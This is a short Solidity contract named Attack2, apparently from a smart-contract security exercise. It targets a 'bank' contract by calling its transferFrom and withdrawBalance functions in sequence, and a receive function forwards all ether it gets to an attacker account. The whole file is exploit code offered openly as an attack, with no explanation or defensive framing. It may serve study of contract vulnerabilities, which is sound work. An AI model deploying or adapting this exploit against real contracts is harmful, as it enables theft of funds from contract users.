// SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.15;

contract Attack2{
    address bank;
    address payable attacker_account;

    constructor(address attackee, address _account){
        bank = attackee;
        attacker_account = payable(_account);
    }

    function transfer(address contract1, uint256 attack_val) public {        
        (bool success, ) = bank.call(
            abi.encodeWithSignature("transferFrom(address,uint256)", contract1, attack_val)
        );

        require(success, "transfer did not go through");
        
        receiveEther();
    }

    function receiveEther() public{
        (bool success, ) = bank.call(
            abi.encodeWithSignature("withdrawBalance()")
        );

        require(success, "withdraw did not go through");
    }

    receive() external payable{
        attacker_account.transfer(msg.value);
    }
}